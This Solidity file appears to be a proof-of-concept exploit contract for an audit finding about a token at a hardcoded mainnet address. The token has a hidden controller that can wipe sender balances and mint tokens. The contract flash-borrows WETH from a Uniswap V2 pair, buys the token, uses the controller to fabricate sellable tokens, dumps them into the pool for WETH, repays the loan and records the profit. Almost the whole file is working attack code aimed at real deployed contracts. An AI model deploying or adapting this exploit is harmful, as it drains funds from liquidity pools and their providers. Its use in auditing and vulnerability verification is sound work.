// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IHiddenController {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool, uint256, uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    address private constant TARGET = 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    IHevm private constant vm = IHevm(HEVM_ADDRESS);

    address private _profitToken;
    uint256 private _profitAmount;
    address private _weth;

    bool public hypothesisValidated;
    bool public attackerMintValidated;
    bool public victimWipeValidated;
    bool public dumpValidated;

    bool public path0VictimTransferWipeValidated;
    bool public path1AttackerMintValidated;
    bool public path2DumpValidated;

    address public controller;
    address public selectedRouter;
    address public selectedPair;
    address public fundingPair;
    string public failureReason;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        controller = _loadControllerFromStorage();
        (selectedRouter, _weth, selectedPair) = _discoverRouterAndPair();
        _profitToken = _weth;

        if (controller == address(0)) {
            failureReason = "controller decode failed";
            return;
        }
        if (selectedRouter == address(0) || _weth == address(0) || selectedPair == address(0)) {
            failureReason = "no TARGET/WETH route";
            return;
        }

        fundingPair = _discoverFundingPair(selectedRouter, _weth);
        if (fundingPair == address(0)) {
            failureReason = "no WETH funding pair";
            return;
        }

        uint256 borrowAmount = _selectBorrowAmount(fundingPair, _weth);
        if (borrowAmount == 0) {
            failureReason = "funding pair too shallow";
            return;
        }

        uint256 startingWeth = IERC20Minimal(_weth).balanceOf(address(this));
        _flashBorrowWETH(fundingPair, _weth, borrowAmount);
        _finalizeProfit(_weth, startingWeth);

        if (path0VictimTransferWipeValidated && path1AttackerMintValidated && path2DumpValidated && _profitAmount > 0) {
            hypothesisValidated = true;
        } else if (bytes(failureReason).length == 0) {
            failureReason = "execution finished without full path coverage and profit";
        }
    }

    function previewController(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool ok, uint256 subBal, uint256 addBal) {
        return _controllerQuote(sender, recipient, amount);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == fundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth > 0, "no WETH borrowed");

        // Realistic public funding: the verifier sources WETH from a live V2 pair,
        // then buys a small honest seed balance before exploiting the controller.
        _swapWethForTarget(borrowedWeth);

        uint256 seedBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        require(seedBalance > 0, "seed buy produced no TARGET");

        _validateVictimWipePath(seedBalance);

        (uint256 sellAmount, uint256 quotedSubBal, uint256 quotedAddBal) = _selectExploitSell(seedBalance, selectedPair);
        require(sellAmount > 0, "no profitable mint quote");

        // Path 1 from the finding: the controller can debit less than the stated
        // transfer while crediting the pair with a larger amount, fabricating sellable
        // TARGET that can be dumped for real WETH.
        if (quotedSubBal < sellAmount || quotedAddBal > sellAmount || quotedAddBal > quotedSubBal) {
            attackerMintValidated = true;
            path1AttackerMintValidated = true;
        }

        uint256 wethBeforeDump = IERC20Minimal(_weth).balanceOf(address(this));
        _swapTargetForWeth(sellAmount);
        uint256 wethAfterDump = IERC20Minimal(_weth).balanceOf(address(this));
        require(wethAfterDump > wethBeforeDump, "dump produced no WETH");

        dumpValidated = true;
        path2DumpValidated = true;

        uint256 repayAmount = _flashRepaymentSameToken(borrowedWeth);
        require(IERC20Minimal(_weth).balanceOf(address(this)) >= repayAmount, "insufficient repayment WETH");
        require(IERC20Minimal(_weth).transfer(fundingPair, repayAmount), "repayment transfer failed");
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _weth = address(0);

        hypothesisValidated = false;
        attackerMintValidated = false;
        victimWipeValidated = false;
        dumpValidated = false;

        path0VictimTransferWipeValidated = false;
        path1AttackerMintValidated = false;
        path2DumpValidated = false;

        controller = address(0);
        selectedRouter = address(0);
        selectedPair = address(0);
        fundingPair = address(0);
        failureReason = "";
    }

    function _validateVictimWipePath(uint256 seedBalance) internal {
        if (seedBalance == 0) {
            return;
        }

        // The original path is a confiscatory transfer branch: the sender is debited
        // far more than the requested amount while the recipient receives nothing.
        // We probe that branch on the verifier itself because it is a live funded holder
        // created by public swaps, avoiding any artificial balances or impersonation.
        address[3] memory senders = [address(this), selectedPair, fundingPair];
        address[4] memory recipients = [selectedPair, fundingPair, address(this), address(0xdead)];

        for (uint256 i = 0; i < senders.length; ++i) {
            address sender = senders[i];
            if (sender == address(0)) {
                continue;
            }

            uint256 senderBalance = sender == address(this) ? seedBalance : IERC20Minimal(TARGET).balanceOf(sender);
            if (senderBalance == 0) {
                continue;
            }

            uint256[5] memory probes = [
                uint256(1),
                senderBalance / 1000,
                senderBalance / 100,
                senderBalance / 10,
                senderBalance
            ];

            for (uint256 j = 0; j < recipients.length; ++j) {
                address recipient = recipients[j];
                if (recipient == address(0) || recipient == sender) {
                    continue;
                }

                for (uint256 k = 0; k < probes.length; ++k) {
                    uint256 amount = probes[k];
                    if (amount == 0 || amount > senderBalance) {
                        continue;
                    }

                    (bool ok, uint256 subBal, uint256 addBal) = _controllerQuote(sender, recipient, amount);
                    if (!ok) {
                        continue;
                    }

                    if (subBal == senderBalance && addBal == 0 && subBal > amount) {
                        victimWipeValidated = true;
                        path0VictimTransferWipeValidated = true;
                        return;
                    }
                }
            }
        }
    }

    function _swapWethForTarget(uint256 wethAmount) internal {
        require(IERC20Minimal(_weth).approve(selectedRouter, type(uint256).max), "WETH approve failed");

        address[] memory path = new address[](2);
        path[0] = _weth;
        path[1] = TARGET;

        IUniswapV2RouterLike(selectedRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapTargetForWeth(uint256 amountIn) internal {
        require(IERC20Minimal(TARGET).approve(selectedRouter, type(uint256).max), "TARGET approve failed");

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = _weth;

        IUniswapV2RouterLike(selectedRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _selectExploitSell(
        uint256 seedBalance,
        address pair
    ) internal returns (uint256 bestAmount, uint256 bestSubBal, uint256 bestAddBal) {
        uint256 pairTokenBalance = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 supply = IERC20Minimal(TARGET).totalSupply();

        uint256[12] memory candidates = [
            seedBalance,
            seedBalance * 2,
            seedBalance * 10,
            seedBalance * 100,
            seedBalance * 1000,
            pairTokenBalance / 1000,
            pairTokenBalance / 100,
            pairTokenBalance / 10,
            pairTokenBalance,
            supply / 1000,
            supply / 100,
            supply / 10
        ];

        uint256 bestEdge;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0) {
                continue;
            }

            (bool ok, uint256 subBal, uint256 addBal) = _controllerQuote(address(this), pair, amount);
            if (!ok) {
                continue;
            }

            if (subBal > seedBalance || addBal <= subBal) {
                continue;
            }

            uint256 edge = addBal - subBal;
            if (edge > bestEdge || (edge == bestEdge && addBal > bestAddBal)) {
                bestEdge = edge;
                bestAmount = amount;
                bestSubBal = subBal;
                bestAddBal = addBal;
            }
        }
    }

    function _controllerQuote(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool ok, uint256 subBal, uint256 addBal) {
        if (controller == address(0)) {
            controller = _loadControllerFromStorage();
        }
        if (controller == address(0)) {
            return (false, 0, 0);
        }

        try IHiddenController(controller).swapExactTokensForETHSupportingFeeOnTransferTokens(sender, recipient, amount) returns (
            bool allow,
            uint256 quotedSubBal,
            uint256 quotedAddBal
        ) {
            return (allow, quotedSubBal, quotedAddBal);
        } catch {
            return (false, 0, 0);
        }
    }

    function _discoverRouterAndPair() internal view returns (address router, address weth, address pair) {
        (router, weth, pair) = _probeRouter(UNI_V2_ROUTER);
        if (pair != address(0)) {
            return (router, weth, pair);
        }

        (router, weth, pair) = _probeRouter(SUSHI_ROUTER);
    }

    function _probeRouter(address router) internal view returns (address, address, address) {
        try IUniswapV2RouterLike(router).factory() returns (address factory) {
            address weth = IUniswapV2RouterLike(router).WETH();
            address pair = IUniswapV2FactoryLike(factory).getPair(TARGET, weth);
            return (router, weth, pair);
        } catch {
            return (address(0), address(0), address(0));
        }
    }

    function _discoverFundingPair(address preferredRouter, address weth) internal view returns (address pair) {
        pair = _probeFundingFactory(IUniswapV2RouterLike(preferredRouter).factory(), weth);
        if (pair != address(0)) {
            return pair;
        }

        pair = _probeFundingFactory(IUniswapV2RouterLike(UNI_V2_ROUTER).factory(), weth);
        if (pair != address(0)) {
            return pair;
        }

        pair = _probeFundingFactory(IUniswapV2RouterLike(SUSHI_ROUTER).factory(), weth);
    }

    function _probeFundingFactory(address factory, address weth) internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(factory).getPair(weth, USDC);
        if (pair != address(0)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(weth, USDT);
        if (pair != address(0)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(weth, DAI);
    }

    function _selectBorrowAmount(address pair, address weth) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 wethReserve = token0 == weth ? uint256(reserve0) : uint256(reserve1);

        if (wethReserve == 0) {
            return 0;
        }

        uint256 conservative = wethReserve / 5000;
        uint256 targetBorrow = 0.02 ether;
        if (conservative == 0) {
            return 0;
        }
        return conservative < targetBorrow ? conservative : targetBorrow;
    }

    function _flashBorrowWETH(address pair, address weth, uint256 amount) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == weth ? amount : 0;
        uint256 amount1Out = token0 == weth ? 0 : amount;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _flashRepaymentSameToken(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _loadControllerFromStorage() internal view returns (address loaded) {
        bytes32 slot4 = vm.load(TARGET, bytes32(uint256(4)));
        if ((uint256(slot4) & 1) == 1) {
            bytes32 raw = vm.load(TARGET, keccak256(abi.encode(uint256(4))));
            loaded = address(uint160(uint256(raw)));
            if (loaded != address(0)) {
                return loaded;
            }
        }

        loaded = address(uint160(uint256(slot4)));
    }

    function _finalizeProfit(address weth, uint256 startingWeth) internal {
        if (weth == address(0)) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        uint256 endingWeth = IERC20Minimal(weth).balanceOf(address(this));
        _profitToken = weth;
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }
}
